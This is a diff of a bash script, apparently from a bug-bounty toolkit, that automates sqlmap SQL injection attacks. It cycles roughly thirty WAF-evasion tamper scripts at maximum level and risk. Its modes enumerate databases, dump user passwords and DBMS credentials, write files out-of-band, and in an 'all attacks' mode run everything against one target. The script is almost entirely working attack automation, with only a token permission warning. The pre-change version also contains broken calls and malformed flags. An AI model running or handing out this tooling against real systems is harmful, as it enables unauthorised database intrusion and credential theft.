@@ -1,315 +1,131 @@
 #!/bin/bash
 
-cute  () {
-
-    echo "                              SQlMAP AUTOMATION"
-    echo "                              NoBoDY HiDe fRoM mE!"
-echo " "
-echo " "
-echo " "
-echo " "
-echo "@Deepak                                                            @binwalk"
-echo " "
-echo "WARNING!!!
-             Nobody takecare of repsonsiblity of you action. always takes a permission."
-echo " "
+# Function to display a colorful banner
+display_banner () {
+    figlet "SQLMAP AUTOMATION" | lolcat
+    echo "NoBoDY HiDe fRoM mE!" | lolcat
+    echo ""
+    echo "@Deepak                                                            @binwalk" | lolcat
+    echo ""
+    echo "WARNING!!!" | lolcat
+    echo "Nobody takes responsibility for your actions. Always seek permission." | lolcat
+    echo ""
 }
-# array of tamper 
-tamp=('apostrophemask' 'apostrophenullencode' 'base64encode' 'between' 'bluecoat' 'chardoubleencode' 'charencode' 'charunicodeencode''concat2concatws ''equaltolike''greatest''halfversionedmorekeywords''ifnull2ifisnull''modsecurityversioned''modsecurityzeroversioned''multiplespaces''nonrecursivereplacement''percentage''randomcase''randomcomments''securesphere''space2comment''space2dash''space2hash''space2morehash''space2mssqlblank''space2mysqldash''space2plus''space2randomblank''unionalltounion''unmagicquotes')
 
+# Array of tamper scripts
+tampers=('apostrophemask' 'apostrophenullencode' 'base64encode' 'between' 'bluecoat' 'chardoubleencode' 'charencode' 'charunicodeencode' 'concat2concatws' 'equaltolike' 'greatest' 'halfversionedmorekeywords' 'ifnull2ifisnull' 'modsecurityversioned' 'modsecurityzeroversioned' 'multiplespaces' 'nonrecursivereplacement' 'percentage' 'randomcase' 'randomcomments' 'securesphere' 'space2comment' 'space2dash' 'space2hash' 'space2morehash' 'space2mssqlblank' 'space2mysqldash' 'space2plus' 'space2randomblank' 'unionalltounion' 'unmagicquotes')
 
-
-
-##
-## Injection based attack in sqlmap 
-##
-injection () {
-             
-    for i in "${tamp[@]}"; do #${arrayName[@]}
-  echo "##################################"
-    echo     "$i"
-    echo "##################################"
-        sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --dbs tamper="$i" --alert="Vulnerability Found"
+# Function to perform SQL injection attacks
+perform_attack () {
+    local attack_type=$1
+    local options=$2
     
+    for tamper in "${tampers[@]}"; do
+        echo "##################################" | lolcat
+        echo "$tamper" | lolcat
+        echo "##################################" | lolcat
+        sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch $options --tamper="$tamper" --alert="Vulnerability Found"
     done
-
-    
 }
 
-##
-## File Based attack 
-##
-
-file_based_attack() {
-
-    for i in "${tamp[@]}"; do #${arrayName[@]}
-  echo "##################################"
-    echo     "$i"
-    echo "##################################"
-       sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --dbs tamper="$i" --alert="Vulnerability Found"
-    
-    done
-    
-}
-
-
-##
-## Brute-based attacks
-##
-
-brute_based_attacks () {
-
-    for i in "${tamp[@]}"; do #${arrayName[@]}
-    echo "##################################"
-    echo     "$i"
-    echo "##################################"
-        sqlmap -m "$urls"  --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --users --passwords --tamper="$i" --alert="Vulnerability Found"
-    
-    done
-
-}
-
-##
-## Time-based attacks
-##
-
-time_based_attacks () {
-
-    for i in "${tamp[@]}"; do #${arrayName[@]}
-    echo "##################################"
-    echo     "$i"
-    echo "##################################"
-    sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --time-sec=5 --dbs --tamper="$i" --alert="Vulnerability Found"
-    
-    done 
-
-}
-
-##
-## Error-based attacks
-##
-
-error_based_attacks () {
-
-    for i in "${tamp[@]}"; do #${arrayName[@]}
-    echo "##################################"
-    echo     "$i"
-    echo "##################################"
-   sqlmap -m "$urls" --dbms="$dbms"--level=5 --risk=3 --threads=5 --batch --errors --tamper="$i" --alert="Vulnerability Found"
-
-    
-    done 
-   
-}
-
-##
-## Blind-based attacks
-##
-
-blind_based_attacks () {
-
-    for i in "${tamp[@]}"; do #${arrayName[@]}
-    echo "##################################"
-    echo     "$i"
-    echo "##################################"
-    sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --dbms-cred --tamper="$i" --alert="Vulnerability Found"
-
-    
-    done 
-}
-
-##
-## Out-of-band attacks 
-##
-
-out_of_band_attacks () {
-
-    for i in "${tamp[@]}"; do #${arrayName[@]}
-    echo "##################################"
-    echo      "$i"
-    echo "##################################"
-    sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --oob --file-write="/tmp/data.txt" --tamper="$i" --alert="Vulnerability Found"
-
-    
-    done      
-
-
-}
-
-
-##
-## Database Detection 
-##
-
-database_detect () {
-
-    for i in "${tamp[@]}"; do #${arrayName[@]}
-    echo "##################################"
-    echo   "$i"
-    echo "##################################"
-    sqlmap -m "$urls"  --level=5 --risk=3 --threads=5 --batch --banner --tamper="$i" --alert="Vulnerability Found"
-
-    
-    done 
-}
-
-
-## starting ##
-##          ## 
-
-process () {
- select attack in  injection_based  file_based blind_based  brute_based time_based error_based out_of_band bayekar data_base_detect 
- do 
-    case $attack in 
-
-        injection_based )
-                      echo " "
-                      echo "(+)Injection Attacks..."
-                      echo " "
-
-                     injection #function 
-                      break
-                       ;;
-        
-        file_based )
-                    echo " "
-                   echo "(+)File Based Attacks..."
-                   echo " "    
-                #echo "====================="
-                   file_based_attackw
-                   break
-                    ;;         
-       blind_based)
-                    echo " "
-                   echo "(+)Blind Based Attack..."
-                   echo " "
-                   blind_based_attacks
-                   break
-                   ;;
-        brute_based)
-                    echo " "
-                   echo "(+)Brute Based Attacks..."
-                   echo " "
-                   brute_based_attacks
-                   break
-                   ;;
-        time_based)
-                    echo " "
-                   echo "(+)Time Based Attacks..."
-                   echo " "
-                   time_based_attacks
-                   break
-                   ;;
-        error_based)
-                    echo " "
-                   echo "(+)Error Based Attacks..."
-                   echo " "
-                   error_based_attacks
-                   break
-                   ;;
-        out_of_band)
-                   echo " "
-                   echo "(+)Out OF Band Attacks..."
-                   echo " "
-                   out_of_band_attacks
-                   break
-                   ;;
-            bayekar)
-              echo " "
-                echo "(+)All attack on single traget..."
-                echo " "
-                ################################
-                sleep 3
-                clear
-                echo "WARNING !"
-                echo "Take Time upto 14 hrs"
-                injection
-                wait
-                file_based_attack
-                wait
-                blind_based_attacks
-                wait
-                brute_based_attacks
-                wait
-                time_based_attacks
-                wait
-                error_based_attacks
-                wait
-                out_of_band_attacks
+# Function to select the type of attack to perform
+select_attack () {
+    select attack in "Injection-based" "File-based" "Blind-based" "Brute-based" "Time-based" "Error-based" "Out-of-band" "Bayekar" "Database Detection"; do
+        case $attack in
+            "Injection-based" )
+                echo "(+) Injection Attacks..." | lolcat
+                perform_attack "injection" "--dbs"
                 break
-                 ;;
-  data_base_detect)
-                    echo " "
-                  echo "(+)Database Detection Start..."
-                  echo " "
-                  database_detect
-                  continue
-                  ;;
-                 *)
-
-                 echo "Try again..fuck you"
-                   continue
-                  ;;
-            esac
- done
+                ;;
+            "File-based" )
+                echo "(+) File Based Attacks..." | lolcat
+                perform_attack "file" "--dbs"
+                break
+                ;;
+            "Blind-based" )
+                echo "(+) Blind Based Attack..." | lolcat
+                perform_attack "blind" "--dbms-cred"
+                break
+                ;;
+            "Brute-based" )
+                echo "(+) Brute Based Attacks..." | lolcat
+                perform_attack "brute" "--users --passwords"
+                break
+                ;;
+            "Time-based" )
+                echo "(+) Time Based Attacks..." | lolcat
+                perform_attack "time" "--time-sec=5 --dbs"
+                break
+                ;;
+            "Error-based" )
+                echo "(+) Error Based Attacks..." | lolcat
+                perform_attack "error" "--errors"
+                break
+                ;;
+            "Out-of-band" )
+                echo "(+) Out Of Band Attacks..." | lolcat
+                perform_attack "oob" "--file-write='/tmp/data.txt'"
+                break
+                ;;
+            "Bayekar" )
+                echo "(+) All attacks on a single target..." | lolcat
+                echo "WARNING! This may take up to 14 hours." | lolcat
+                perform_attack "bayekar" "--dbs"
+                perform_attack "bayekar" "--users --passwords"
+                perform_attack "bayekar" "--time-sec=5 --dbs"
+                perform_attack "bayekar" "--errors"
+                perform_attack "bayekar" "--file-write='/tmp/data.txt'"
+                break
+                ;;
+            "Database Detection" )
+                echo "(+) Database Detection Start..." | lolcat
+                perform_attack "database" "--banner"
+                continue
+                ;;
+            * )
+                echo "Invalid selection. Please try again." | lolcat
+                continue
+                ;;
+        esac
+    done
 }
 
-# instaltion
-setup () {
-    
-     TOOL="sqlmap"
-     
-    if ! command -v $TOOL &> /dev/null; then
-    echo "$TOOL is not installed."
-    sudo apt update -y
-    clear
-    sudo apt upgrade -y
-    clear
-    sudo apt autoremove -y
-    clear
-    sudo apt autoclean -y
-    clear
-    sudo apt dist-update -y
-    clear
-    sudo apt install sqlmap
-    clear
-    cute
-    process
+# Function to install required tools
+install_tools () {
+    local tool="sqlmap"
+    local distro=$(grep '^ID=' /etc/os-release | awk -F= '{print $2}')
+
+    if ! command -v $tool &> /dev/null; then
+        echo "$tool is not installed." | lolcat
+        if [[ "$distro" == "arch" || "$distro" == "manjaro" ]]; then
+            sudo pacman -Sy --noconfirm
+            sudo pacman -S --noconfirm sqlmap figlet toilet lolcat
+        elif [[ "$distro" == "debian" || "$distro" == "ubuntu" ]]; then
+            sudo apt update -y && sudo apt install -y sqlmap figlet toilet lolcat
+        else
+            echo "Unsupported distribution. Please install sqlmap, figlet, toilet, and lolcat manually."
+            exit 1
+        fi
     else
-    echo "$TOOL is already installed."
-    clear
-    cute
-    process
+        echo "$tool is already installed." | lolcat
     fi
+}
+
+# Function to create necessary folders
+create_folders () {
+    mkdir -p bugbounty/sqlmap && cd bugbounty/sqlmap || exit
+}
+
+# Main script execution
+main () {
+    urls=$1
+    dbms=$2
     
+    create_folders
+    install_tools
+    display_banner
+    select_attack
 }
 
-
-#creating a folder with domain 
-folder () {
-
-  pwd
-
-  #create folder name bugbounty
-  mkdir bugbounty ; cd bugbounty ||
-  pwd
-
-  #create domain folder
-  mkdir sqlmap ; cd sqlmap ||
-  pwd
-
-}
-# fir () {
-# # read -p "Enter the filename's" urls
-# # echo $urls
-# # read -p "Enter the dbms name " dbms
-
-# }
-# #folder function is closed
-# fir
-urls=$1
-dbms=$2
-folder
-setup
-
-
+# Run the main function with provided arguments
+main "$@"
